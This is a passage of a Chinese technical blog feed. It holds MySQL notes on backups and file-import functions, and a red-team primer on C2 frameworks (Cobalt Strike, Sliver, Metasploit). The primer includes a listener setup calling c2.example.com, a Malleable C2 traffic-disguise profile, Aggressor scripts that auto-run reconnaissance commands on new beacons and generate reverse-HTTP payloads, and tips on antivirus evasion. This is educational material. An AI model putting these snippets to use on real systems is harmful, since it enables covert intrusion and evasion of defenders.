title="事件调度器适合哪些任务？"></a>事件调度器适合哪些任务？</h2><ul><li>自动清理过期数据</li><li>定时归档、备份表数据</li><li>批量状态更新（如标记过期订单、失效优惠券）</li><li>生成日报、统计表数据等</li></ul><hr><h1 id="备份恢复"><a href="#备份恢复" class="headerlink" title="备份恢复"></a>备份恢复</h1><p><code>mysqldump</code> 是 MySQL 提供的一个命令行工具，用于备份 MySQL 数据库的内容。它可以导出数据库中的表、数据和结构，并生成 SQL 脚本，可以用于恢复数据或迁移数据。下面是常见的 <code>mysqldump</code> 使用方法。</p><h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u 用户名 -p 数据库名 &gt; 备份文件.sql</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><code>-u</code>：指定 MySQL 用户名。</li><li><code>-p</code>：提示输入密码（密码不需要在命令中直接输入，<code>-p</code> 后不接密码，执行后会提示你输入密码）。</li><li><code>数据库名</code>：要备份的数据库名称。</li><li><code>备份文件.sql</code>：备份文件保存的路径和文件名。</li></ul><p><strong>备份单个数据库</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u root -p my_database &gt; my_database_backup.sql</span><br></pre></td></tr></table></figure><p>这条命令将备份名为 <code>my_database</code> 的数据库，备份文件保存为 <code>my_database_backup.sql</code>。</p><p><strong>备份多个数据库</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u root -p --databases db1 db2 db3 &gt; backup.sql</span><br></pre></td></tr></table></figure><p>此命令将备份 <code>db1</code>、<code>db2</code> 和 <code>db3</code> 这三个数据库，备份数据会合并到 <code>backup.sql</code> 中。</p><p><strong>备份所有数据库</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u root -p --all-databases &gt; all_databases_backup.sql</span><br></pre></td></tr></table></figure><p>此命令备份所有 MySQL 数据库。</p><p><strong>只备份数据库结构（不包含数据）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u root -p -d my_database &gt; my_database_structure.sql</span><br></pre></td></tr></table></figure><p><code>-d</code> 选项表示只备份数据库的结构（表结构、视图、存储过程等），不备份数据。</p><hr><p><strong>备份某个表</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u root -p my_database my_table &gt; my_table_backup.sql</span><br></pre></td></tr></table></figure><p>此命令将备份 <code>my_database</code> 数据库中的 <code>my_table</code> 表。</p><hr><p><strong>包含触发器和事件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u root -p --routines --triggers --events my_database &gt; my_database_with_triggers.sql</span><br></pre></td></tr></table></figure><p>使用 <code>--routines</code>、<code>--triggers</code> 和 <code>--events</code> 选项可以将触发器、存储过程&#x2F;函数以及事件一起备份。</p><hr><p><strong>压缩备份文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u root -p my_database | gzip &gt; my_database_backup.sql.gz</span><br></pre></td></tr></table></figure><p>这条命令将备份数据压缩成 <code>.gz</code> 格式，以节省磁盘空间。</p><h2 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h2><p>使用 <code>mysqldump</code> 导出的 SQL 文件可以通过 <code>mysql</code> 命令来恢复：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u 用户名 -p 数据库名 &lt; 备份文件.sql</span><br></pre></td></tr></table></figure><p>例如，恢复 <code>my_database_backup.sql</code> 文件到数据库 <code>my_database</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p my_database &lt; my_database_backup.sql</span><br></pre></td></tr></table></figure><h2 id="其他常用选项"><a href="#其他常用选项" class="headerlink" title="其他常用选项"></a>其他常用选项</h2><ul><li><code>--no-tablespaces</code>：避免导出表空间信息。</li><li><code>--single-transaction</code>：确保导出时不锁表，适用于 InnoDB 存储引擎。</li><li><code>--quick</code>：在导出大数据时，逐行读取数据，避免内存消耗过多。</li></ul><h1 id="与文件系统交互"><a href="#与文件系统交互" class="headerlink" title="与文件系统交互"></a>与文件系统交互</h1><p><strong>MySQL 可以与文件系统进行交互</strong>，但能力是有限的，且带有一定安全风险。主要支持的交互方式包括：</p><ul><li>读文件（如导入 CSV、读取文本）</li><li>写文件（如导出查询结果、写日志）</li></ul><hr><h2 id="常见文件操作方式"><a href="#常见文件操作方式" class="headerlink" title="常见文件操作方式"></a>常见文件操作方式</h2><h3 id="从文件读取数据（导入）"><a href="#从文件读取数据（导入）" class="headerlink" title="从文件读取数据（导入）"></a>从文件读取数据（导入）</h3><p>使用 <code>LOAD DATA INFILE</code> 读取文本文件的数据插入表中：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LOAD DATA INFILE <span class="string">&#x27;/path/to/data.csv&#x27;</span></span><br><span class="line"><span class="keyword">INTO</span> <span class="keyword">TABLE</span> my_table</span><br><span class="line">FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;,&#x27;</span></span><br><span class="line">ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">IGNORE <span class="number">1</span> LINES;</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>支持读取 CSV、TSV 等纯文本格式</li><li>需要文件在 <strong>数据库服务器本地磁盘</strong></li><li>需要开启 <code>local_infile</code> 选项（否则报错）</li></ul><p>查看配置：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;local_infile&#x27;</span>;</span><br></pre></td></tr></table></figure><p>启用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> local_infile <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h3 id="将查询结果写入文件（导出）"><a href="#将查询结果写入文件（导出）" class="headerlink" title="将查询结果写入文件（导出）"></a>将查询结果写入文件（导出）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users</span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/tmp/users_export.csv&#x27;</span></span><br><span class="line">FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;,&#x27;</span></span><br><span class="line">ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\n&#x27;</span>;</span><br></pre></td></tr></table></figure><p>限制：</p><ul><li>路径必须是 <strong>服务器上的绝对路径</strong></li><li>目标文件 <strong>不能存在</strong>（否则报错）</li><li>MySQL 进程必须有权限写入该路径</li></ul><hr><h2 id="安全性限制说明"><a href="#安全性限制说明" class="headerlink" title="安全性限制说明"></a>安全性限制说明</h2><p>出于安全考虑，MySQL 默认限制了文件操作能力：</p><ol><li><strong>只能操作服务器本地文件</strong></li><li><code>INTO OUTFILE</code> 不能覆盖已存在的文件</li><li>不支持写入任意目录，通常只能在 <code>secure_file_priv</code> 设置的路径中写</li></ol><p>查看该路径：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;secure_file_priv&#x27;</span>;</span><br></pre></td></tr></table></figure><p>如果结果是某个目录，只能在这个目录内进行读写操作。</p><p>如果是空字符串，表示<strong>可访问任意路径</strong>（不推荐）</p><p>如果是 <code>NULL</code>，表示完全禁用了文件导入导出。</p><hr><h2 id="用于日志或文本处理的函数"><a href="#用于日志或文本处理的函数" class="headerlink" title="用于日志或文本处理的函数"></a>用于日志或文本处理的函数</h2><p>MySQL 不支持动态操作文件系统，比如：</p><ul><li>不支持列出目录文件</li><li>不支持创建文件、移动文件</li><li>也不能直接在 SQL 中写系统命令</li></ul><p>但可以通过函数处理文本内容：</p><ul><li><code>LOAD_FILE(&#39;/path/to/file.txt&#39;)</code>：可以将服务器上的文本文件内容读入，返回字符串</li><li>仅在 <code>secure_file_priv</code> 设置允许的路径下可用</li></ul><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="string">&#x27;/var/lib/mysql-files/notes.txt&#x27;</span>);</span><br></pre></td></tr></table></figure><p>返回文件的全部文本内容（适合读配置、静态文本）。</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Mysql基础&quot;&gt;&lt;a href=&quot;#Mysql基础&quot; class=&quot;headerlink&quot; title=&quot;Mysql基础&quot;&gt;&lt;/a&gt;Mysql基础&lt;/h1&gt;&lt;p&gt;MySQL 是一个开源的关系型数据库管理系统，说白了就是可以用它来存储、查询和管理数据。比如写个网站</summary>
      
    
    
    
    
    <category term="Mysql" scheme="https://lyi61pd.github.io/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>C2</title>
    <link href="https://lyi61pd.github.io/2025/04/08/C2/"/>
    <id>https://lyi61pd.github.io/2025/04/08/C2/</id>
    <published>2025-04-08T00:00:00.000Z</published>
    <updated>2025-07-30T03:40:55.099Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C2基础"><a href="#C2基础" class="headerlink" title="C2基础"></a>C2基础</h1><h2 id="什么是-C2-框架"><a href="#什么是-C2-框架" class="headerlink" title="什么是 C2 框架"></a>什么是 C2 框架</h2><p>C2（Command &amp; Control）框架是攻击链中控制阶段的核心部分，用于红队与植入目标主机的木马（Agent&#x2F;Beacon）之间建立通信，执行命令、收集信息、上传下载文件、做横向移动等等。C2 框架的本质是一套包含控制端（Server）与客户端（Payload&#x2F;Beacon）的通信系统。</p><hr><h2 id="主流-C2-框架架构设计拆解"><a href="#主流-C2-框架架构设计拆解" class="headerlink" title="主流 C2 框架架构设计拆解"></a>主流 C2 框架架构设计拆解</h2><h3 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h3><p><strong>结构组成：</strong></p><ul><li><strong>Team Server</strong>：C2 控制端，负责所有 Beacon 的统一管理。</li><li><strong>Beacon</strong>：客户端的植入载荷，支持多种通信方式（HTTP、HTTPS、DNS、SMB 等）。</li><li><strong>Aggressor Script</strong>：脚本引擎，支持行为自动化。</li><li><strong>Client GUI</strong>：操作端，用于管理和执行命令。</li></ul><p><strong>特点：</strong></p><ul><li>Beacon 模块化强，通信协议支持自定义混淆。</li><li>强大的内存马管理与无文件攻击能力。</li><li>配合 Malleable C2 支持流量伪装成任意合法 Web 通信。</li></ul><h3 id="Sliver"><a href="#Sliver" class="headerlink" title="Sliver"></a>Sliver</h3><p><strong>结构组成：</strong></p><ul><li><strong>Server（sliver-server）</strong>：核心服务端，gRPC + TLS 通信。</li><li><strong>Client（sliver-client）</strong>：CLI 或 Web UI，操作指令中心。</li><li><strong>Implants（sliver implants）</strong>：客户端植入程序，支持多平台（Windows&#x2F;Linux&#x2F;macOS）。</li><li><strong>Transport</strong>：支持多协议通信（HTTP&#x2F;HTTPS、DNS、MTLS、Wireguard）。</li></ul><p><strong>特点：</strong></p><ul><li>开源，Go 编写，便于二次开发。</li><li>支持多种 listener&#x2F;transport，灵活性强。</li><li>支持反射 DLL 注入、BOF 执行（内存模块化执行）。</li><li>强大的 OPSEC 特性，比如动态切换通信信道。</li></ul><h3 id="Metasploit-Framework"><a href="#Metasploit-Framework" class="headerlink" title="Metasploit Framework"></a>Metasploit Framework</h3><p><strong>结构组成：</strong></p><ul><li><strong>msfconsole</strong>：主控台，命令行交互中心。</li><li><strong>exploit&#x2F;payload 模块</strong>：负责漏洞利用与载荷投递。</li><li><strong>handler（multi&#x2F;handler）</strong>：监听器，用来接收回连。</li><li><strong>Meterpreter</strong>：高度模块化的反向连接 shell。</li></ul><p><strong>特点：</strong></p><ul><li>经典老牌，模块最全，生态强大。</li><li>Meterpreter 支持脚本、插件、内存加载模块。</li><li>强大但略显笨重，不如 Cobalt Strike 那么轻巧隐蔽。</li></ul><hr><h2 id="常见功能模块对比"><a href="#常见功能模块对比" class="headerlink" title="常见功能模块对比"></a>常见功能模块对比</h2><table><thead><tr><th>功能模块</th><th>Cobalt Strike</th><th>Sliver</th><th>Metasploit</th></tr></thead><tbody><tr><td>多协议通信</td><td>支持</td><td>支持</td><td>支持</td></tr><tr><td>模块热插拔</td><td>强</td><td>中</td><td>弱（Meterpreter 限）</td></tr><tr><td>内存执行</td><td>强（BOF）</td><td>强（BOF）</td><td>中</td></tr><tr><td>插件扩展性</td><td>Aggressor 脚本</td><td>自定义模块</td><td>Ruby 模块化</td></tr><tr><td>操作系统支持</td><td>Windows 为主</td><td>Win&#x2F;Linux&#x2F;macOS</td><td>Win&#x2F;Linux</td></tr><tr><td>UI</td><td>图形界面</td><td>CLI&#x2F;Web UI</td><td>CLI</td></tr><tr><td>流量混淆</td><td>Malleable C2</td><td>支持多种伪装方式</td><td>基础混淆</td></tr></tbody></table><hr><h2 id="常见问题理解"><a href="#常见问题理解" class="headerlink" title="常见问题理解"></a>常见问题理解</h2><h3 id="为什么-C2-通信协议多样化重要？"><a href="#为什么-C2-通信协议多样化重要？" class="headerlink" title="为什么 C2 通信协议多样化重要？"></a>为什么 C2 通信协议多样化重要？</h3><p>不同的网络环境下，有的端口封闭、有的协议被 DPI 检测，通信多样化能提高植入后的存活率和隐蔽性。</p><h3 id="什么是-BOF（Beacon-Object-File）？"><a href="#什么是-BOF（Beacon-Object-File）？" class="headerlink" title="什么是 BOF（Beacon Object File）？"></a>什么是 BOF（Beacon Object File）？</h3><p>BOF 是 Cobalt Strike 引入的一种运行内存模块的小型 C 语言对象文件，可以在 Beacon 中直接运行，无需生成 EXE 或 DLL，从而提升隐蔽性。Sliver 也支持类似机制。</p><h3 id="如何理解“无文件攻击”？"><a href="#如何理解“无文件攻击”？" class="headerlink" title="如何理解“无文件攻击”？"></a>如何理解“无文件攻击”？</h3><p>无文件攻击指的是不在硬盘落地任何可执行文件，所有操作都在内存中完成（例如通过 PowerShell、Reflective DLL Injection、BOF 等方式），这可以绕过大部分杀软的文件监控策略。</p><h3 id="这些框架能扩展吗？"><a href="#这些框架能扩展吗？" class="headerlink" title="这些框架能扩展吗？"></a>这些框架能扩展吗？</h3><ul><li>Cobalt Strike 的 Aggressor Script 可以写自动化逻辑、钓鱼剧本等。</li><li>Sliver 本身就是开源的，开发者可以基于其 gRPC 接口写出新模块或整合其他工具。</li><li>Metasploit 框架最容易写模块，自带模板功能，开发周期短。</li></ul><hr><h2 id="红队研发该如何深入学习这些框架？"><a href="#红队研发该如何深入学习这些框架？" class="headerlink" title="红队研发该如何深入学习这些框架？"></a>红队研发该如何深入学习这些框架？</h2><ol><li><strong>实操为主</strong>：搭环境，打靶场，不懂的功能就翻官方文档和社区。</li><li><strong>读源码&#x2F;脚本</strong>：<ul><li>Sliver 是 Go 写的，可以研究通信和 implant 架构。</li><li>Aggressor Script 学会后能帮你自动化红队很多流程。</li></ul></li><li><strong>看流量包分析通信协议</strong>：理解通信包结构对规避检测很有帮助。</li><li><strong>做开发小模块</strong>：比如给 Sliver 增加一个新的 transport，或者给 Meterpreter 写一个提权模块。</li></ol><h1 id="Cobalt-Strike-1"><a href="#Cobalt-Strike-1" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h1><p>好嘞，那我们从 Cobalt Strike 开始拆，一步步搞清楚它的整体架构、核心组件、通信机制、扩展能力还有一些常见的玩法。这玩意虽然闭源，但文档详细、生态成熟，基本是红队的标配了。</p><hr><h2 id="Cobalt-Strike-架构核心理解"><a href="#Cobalt-Strike-架构核心理解" class="headerlink" title="Cobalt Strike 架构核心理解"></a>Cobalt Strike 架构核心理解</h2><p>Cobalt Strike 整体架构是经典的 C2 结构，分为控制端（Team Server）和被控端（Beacon），中间通过 Listener 建立通信通道。可以简单理解为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[CS Client GUI] → [Team Server] ←→ [Beacon]</span><br></pre></td></tr></table></figure><h3 id="1-Team-Server（服务端）"><a href="#1-Team-Server（服务端）" class="headerlink" title="1. Team Server（服务端）"></a>1. Team Server（服务端）</h3><ul><li>所有 Beacon 的连接都汇聚到这里。</li><li>接收 GUI 发来的操作命令，下发给 Beacon。</li><li>支持多个 listener，可用不同协议监听不同 implant。</li><li>支持操作记录、会话管理、任务队列、证书伪造等功能。</li></ul><p>启动方式通常是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver &lt;公网IP&gt; &lt;密码&gt;</span><br></pre></td></tr></table></figure><p>TeamServer 是服务端大脑，很多 hook 和扩展逻辑其实都要和它打交道。</p><hr><h3 id="2-Beacon（客户端-植入端）"><a href="#2-Beacon（客户端-植入端）" class="headerlink" title="2. Beacon（客户端&#x2F;植入端）"></a>2. Beacon（客户端&#x2F;植入端）</h3><p>Beacon 是攻击者植入目标系统中的主力载荷，是 Cobalt Strike 的核心组件之一。它的设计非常灵活，支持多种执行方式和通信协议。</p><p><strong>支持的通信方式：</strong></p><ul><li><code>HTTP</code> &#x2F; <code>HTTPS</code>：常见 web 通道，配合 Malleable C2 做流量伪装。</li><li><code>DNS</code>：低速但高隐蔽，适合静默场景。</li><li><code>SMB</code>：横向移动常用，内网通信，免出网。</li><li><code>TCP</code> &#x2F; <code>Named Pipe</code>：定制场景用得多。</li></ul><p><strong>Beacon 的通信机制：</strong></p><ul><li>默认是“轮询式通信”：<ul><li>Beacon 每隔一段时间（默认 60s）主动回连 Team Server。</li><li>这个时间间隔（sleep）和 jitter（抖动）可以配置。</li></ul></li><li>通信全程加密（SSL&#x2F;TLS），可通过 Malleable Profile 自定义。</li></ul><hr><h3 id="3-Listener（监听器）"><a href="#3-Listener（监听器）" class="headerlink" title="3. Listener（监听器）"></a>3. Listener（监听器）</h3><p>Listener 是在 Team Server 上开的一种“通信协议通道”，Beacon 会回连到这个 listener。</p><p>你可以配置不同协议的 listener，比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Listener: HTTPS</span><br><span class="line">Payload: windows/beacon_https/reverse_https</span><br><span class="line">Host: https://c2.example.com</span><br></pre></td></tr></table></figure><p>Listener 是一个非常灵活的点，它支持用同一 Team Server 管多个 Beacon 会话，分别回连到不同端口、协议、路径、伪装页面。</p><hr><h2 id="Malleable-C2：伪装大师"><a href="#Malleable-C2：伪装大师" class="headerlink" title="Malleable C2：伪装大师"></a>Malleable C2：伪装大师</h2><p>这是 Cobalt Strike 最大的核心卖点之一。</p><p>它允许你自定义 C2 流量的 HTTP 请求&#x2F;响应外观，能伪装成合法网站（如微软更新、CDN 等），极大地提升流量隐蔽性。</p><p><strong>Malleable C2 配置结构：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> useragent <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;</span>;</span><br><span class="line">http-get &#123;</span><br><span class="line">  <span class="built_in">set</span> uri <span class="string">&quot;/api/status&quot;</span>;</span><br><span class="line">  client &#123;</span><br><span class="line">    header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;application/json&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  server &#123;</span><br><span class="line">    output &#123;</span><br><span class="line">      base64;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Cobalt Strike 本身提供了大量的 Malleable C2 profile 示例，比如 mimicking GitHub、Google、Microsoft 等常见服务。</p><hr><h2 id="Aggressor-Script：自动化和扩展利器"><a href="#Aggressor-Script：自动化和扩展利器" class="headerlink" title="Aggressor Script：自动化和扩展利器"></a>Aggressor Script：自动化和扩展利器</h2><p>Aggressor Script 是基于 JavaScript-like 的脚本语言，用于编写自动化流程和 UI 交互功能。</p><p><strong>功能包括：</strong></p><ul><li>自动生成 phishing 邮件、payload。</li><li>会话上线后自动执行命令。</li><li>自定义菜单、界面组件。</li><li>和外部工具联动（如 C2lint、Threat Intel）。</li></ul><p>例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">on beacon_initial &#123;</span><br><span class="line">  <span class="title function_">binput</span>($1, <span class="string">&quot;whoami\n&quot;</span>);</span><br><span class="line">  <span class="title function_">binput</span>($1, <span class="string">&quot;net user\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个脚本会在 beacon 上线时自动执行两个命令。</p><hr><h2 id="Cobalt-Strike-的一些经典功能模块"><a href="#Cobalt-Strike-的一些经典功能模块" class="headerlink" title="Cobalt Strike 的一些经典功能模块"></a>Cobalt Strike 的一些经典功能模块</h2><ul><li><strong>攻击载荷生成（Payload Generator）</strong>：<ul><li>EXE、DLL、PS1、SCT、HTA、Java、Shellcode 全家桶支持。</li><li>可通过 Artifact Kit 自定义绕杀签名。</li></ul></li><li><strong>提权（Privilege Escalation）</strong>：<ul><li>UAC Bypass、令牌劫持、SeImpersonate 工具集成。</li></ul></li><li><strong>横向移动（Lateral Movement）</strong>：<ul><li>PsExec、WMI、WinRM、SMB Beacon 派发。</li></ul></li><li><strong>会话管理</strong>：<ul><li>Beacon 可以与其他 Beacon 建立 SMB 通道（类似链式代理）。</li><li>也支持在多 TeamServer 之间跳转（多级代理）。</li></ul></li></ul><hr><h2 id="常见问题答疑"><a href="#常见问题答疑" class="headerlink" title="常见问题答疑"></a>常见问题答疑</h2><h3 id="Beacon-会话为什么看起来“断断续续”？"><a href="#Beacon-会话为什么看起来“断断续续”？" class="headerlink" title="Beacon 会话为什么看起来“断断续续”？"></a>Beacon 会话为什么看起来“断断续续”？</h3><p>因为默认是轮询通信（sleep 模式），不是实时连接。需要理解 <code>sleep</code> 和 <code>jitter</code> 对通信行为的影响。可以通过 <code>sleep 0</code> 设置为实时响应。</p><h3 id="如何提升-Beacon-隐蔽性？"><a href="#如何提升-Beacon-隐蔽性？" class="headerlink" title="如何提升 Beacon 隐蔽性？"></a>如何提升 Beacon 隐蔽性？</h3><ul><li>使用 HTTPS 或 DNS 通信；</li><li>自定义 Malleable C2 Profile；</li><li>Beacon Payload 用 shellcode loader 包裹，绕过查杀；</li><li>配合睡眠混淆（sleep_mask）模块进行内存隐藏。</li></ul><h3 id="如何使用-BOF-模块？"><a href="#如何使用-BOF-模块？" class="headerlink" title="如何使用 BOF 模块？"></a>如何使用 BOF 模块？</h3><p>BOF（Beacon Object File）是 Cobalt Strike 新版支持的内存模块加载方式，类似动态链接库，在 Beacon 中加载执行但不会落地。</p><p>执行方式类似：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bof mymodule.o arg1 arg2</span><br></pre></td></tr></table></figure><p>BOF 用 C 写，编译成 COFF 文件。</p><hr><p>如果你接下来想动手搭个实验环境，或者深入看看 Beacon 的 payload 是怎么生效的，我可以接着带你拆 payload 结构或者讲讲 bypass AV&#x2F;EDR 的套路。你想先搞哪个？</p><h1 id="Aggressor-Script"><a href="#Aggressor-Script" class="headerlink" title="Aggressor Script"></a><strong>Aggressor Script</strong></h1><p>Aggressor Script 是 Cobalt Strike 内置的一套脚本语言，用来 <strong>扩展 Cobalt Strike 的功能、实现自动化操作、增强交互性</strong>。它是基于 JavaScript 的语法风格，但专门为红队场景定制了一套 API，可以直接操作 Beacon、界面、事件钩子等。</p><p>简单来说，<strong>它就是给 Cobalt Strike 加外挂的方式</strong>，很多高级玩法都离不开它，比如：</p><ul><li>Beacon 上线自动执行命令</li><li>自定义右键菜单</li><li>监听某个事件触发自定义行为</li><li>与外部工具联动（Web API、自动打点、图标美化…）</li></ul><hr><h2 id="Aggressor-Script-能干啥？"><a href="#Aggressor-Script-能干啥？" class="headerlink" title="Aggressor Script 能干啥？"></a>Aggressor Script 能干啥？</h2><p>我按功能分类列一下，让你有个整体感觉。</p><h3 id="1-自动响应事件（事件驱动）"><a href="#1-自动响应事件（事件驱动）" class="headerlink" title="1. 自动响应事件（事件驱动）"></a>1. 自动响应事件（事件驱动）</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">on beacon_initial &#123;</span><br><span class="line">  <span class="title function_">binput</span>($1, <span class="string">&quot;whoami\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Beacon 刚上线时，自动执行 <code>whoami</code> 命令。</p><h3 id="2-扩展菜单-UI"><a href="#2-扩展菜单-UI" class="headerlink" title="2. 扩展菜单 &#x2F; UI"></a>2. 扩展菜单 &#x2F; UI</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">popup beacon_top &#123;</span><br><span class="line">  item <span class="string">&quot;列出用户&quot;</span> &#123;</span><br><span class="line">    <span class="title function_">binput</span>($1, <span class="string">&quot;net user\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Beacon 右键菜单中加一项“列出用户”，点一下就发送命令。</p><h3 id="3-自定义函数-模块化脚本"><a href="#3-自定义函数-模块化脚本" class="headerlink" title="3. 自定义函数 &#x2F; 模块化脚本"></a>3. 自定义函数 &#x2F; 模块化脚本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sub say_hello &#123;</span><br><span class="line">  <span class="title function_">println</span>(<span class="string">&quot;Hello, Aggressor!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以封装一些重复逻辑，形成工具包式结构。</p><h3 id="4-自动生成钓鱼文件、Payload-载荷"><a href="#4-自动生成钓鱼文件、Payload-载荷" class="headerlink" title="4. 自动生成钓鱼文件、Payload 载荷"></a>4. 自动生成钓鱼文件、Payload 载荷</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">on ready &#123;</span><br><span class="line">  <span class="title function_">artifact</span>(<span class="string">&quot;windows/beacon_http/reverse_http&quot;</span>, <span class="string">&quot;exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动后自动生成一个载荷文件。</p><h3 id="5-网络联动-REST-API-调用"><a href="#5-网络联动-REST-API-调用" class="headerlink" title="5. 网络联动 &#x2F; REST API 调用"></a>5. 网络联动 &#x2F; REST API 调用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">local</span>(<span class="string">&#x27;$res&#x27;</span>);</span><br><span class="line">$res = <span class="title function_">http</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://127.0.0.1/api/status&quot;</span>);</span><br><span class="line"><span class="title function_">println</span>(<span class="string">&quot;Status: $res&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以向外部系统发请求，比如联动监控平台、调度框架等。</p><hr><h2 id="常用函数-命令速查（选几个经典的）"><a href="#常用函数-命令速查（选几个经典的）" class="headerlink" title="常用函数&#x2F;命令速查（选几个经典的）"></a>常用函数&#x2F;命令速查（选几个经典的）</h2><table><thead><tr><th>函数名</th><th>用途</th></tr></thead><tbody><tr><td><code>binput()</code></td><td>向 Beacon 会话发命令</td></tr><tr><td><code>beacons()</code></td><td>获取当前所有 beacon 会话列表</td></tr><tr><td><code>println()</code></td><td>输出调试信息到控制台</td></tr><tr><td><code>http()</code></td><td>发起 HTTP 